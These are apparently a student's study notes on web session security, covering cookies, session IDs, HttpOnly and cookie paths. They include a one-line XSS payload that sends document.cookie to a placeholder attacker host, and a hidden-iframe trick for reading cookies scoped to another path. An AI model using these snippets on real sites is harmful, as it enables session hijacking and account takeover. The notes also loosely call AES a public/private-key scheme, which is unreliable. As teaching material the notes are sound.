# Session attacks

## Session recap

- Server use cookies to implement the sessions.
- Server keeps a set of data related to a users session

## Ambient authority

Access control based on a global persistent form
Four types

1. cookies
2. IP checking
3. Built-in HTTP authentication
4. Client certificates

## Shortcoming in the [Session-2](02-cookies-sessions.md) way of storing cookies

We set the cookie as a plain text username and anyone can simply spoof this cookies on the client and sign in as some other user.

To avoid this we send a tag that is AES encrypted using a public and a private key and the browser now, along with the username cookies also sends the tag which would be used for verification. This avoids user spoofing to be someones else. And once you log-out the cookie is removed.

But in our current server approach, shortcoming is, if a malware can sniff out my cookie, now it can log-in and keep accessing even if we have logged out.

Can fix this by creating a unique sessionId associated with the session and destroy it when you logout.

Session Hijacking via XSS

If website is vulnerable to xss, user can execute the insert the code into the webpage and can ex-filtrate the cookie.

```js
new Image().src = "https://hacker-man?cookie=" + document.cookie;
```

Workout being set cookie with HttpOnly

As an additional layer of security, you can specify a path to your cookies
`name=xyz; Path=/a/b`

Now even if you're in the same domain, but on a diff path you won't get the cookie attached or have access to it.

We can get around this by creating an iFrame and load the target path in your page

```js
// on page .../b/c

const iframe = document.createElement("iframe");

iframe.src = ".../a/b";

document.body.append(iframe);

iframe.style.display = "none";

// then get access via

iframe.contentDocument;
```
